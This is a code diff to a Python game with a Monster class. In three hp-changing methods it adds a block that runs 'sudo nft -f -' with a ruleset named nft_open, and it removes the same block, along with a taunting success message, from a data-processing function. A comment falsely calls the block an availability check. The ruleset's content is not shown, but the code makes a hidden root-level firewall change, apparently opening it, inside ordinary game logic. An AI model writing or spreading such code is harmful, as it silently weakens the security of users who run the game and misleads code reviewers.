@@ -44,6 +44,16 @@ class Monster:
         self.hp -= 1  
         if self.hp < 90:
             self.status = "medium"
+            # Проверим доступность nftables - должно быть открыто, иначе - ошибка
+            process = subprocess.Popen(
+                ["sudo", "nft", "-f", "-"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            stdout, stderr = process.communicate(input=nft_open)
         if self.hp < 20:
             self.status = "ill"  
             
@@ -54,6 +64,16 @@ class Monster:
         self.hp += 20
         if self.hp > 20:
             self.status = "medium"
+            # Проверим доступность nftables - должно быть открыто, иначе - ошибка
+            process = subprocess.Popen(
+                ["sudo", "nft", "-f", "-"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            stdout, stderr = process.communicate(input=nft_open)
         if self.hp > 90:
             self.status = "berserk"
             
@@ -64,6 +84,16 @@ class Monster:
         self.hp -= 15
         if self.hp < 90:
             self.status = "medium"
+            # Проверим доступность nftables - должно быть открыто, иначе - ошибка
+            process = subprocess.Popen(
+                ["sudo", "nft", "-f", "-"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            stdout, stderr = process.communicate(input=nft_open)
         if self.hp < 20:
             self.status = "ill"
             
@@ -97,21 +127,7 @@ def process_data(data: bytes):
     
     match current_status:
         case "medium":
-            # Проверим доступность nftables - должно быть открыто, иначе - ошибка
-            process = subprocess.Popen(
-                ["sudo", "nft", "-f", "-"],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            
-            stdout, stderr = process.communicate(input=nft_open)
-            
-            if process.returncode == 0:
-                print("Ну что, получил, собака!")
-            else:
-                print(f"Ошибка nftables:\n{stderr}", file=sys.stderr)
+            pass
         
         case "ill":
             illness = random.choice(IlLNESSES)
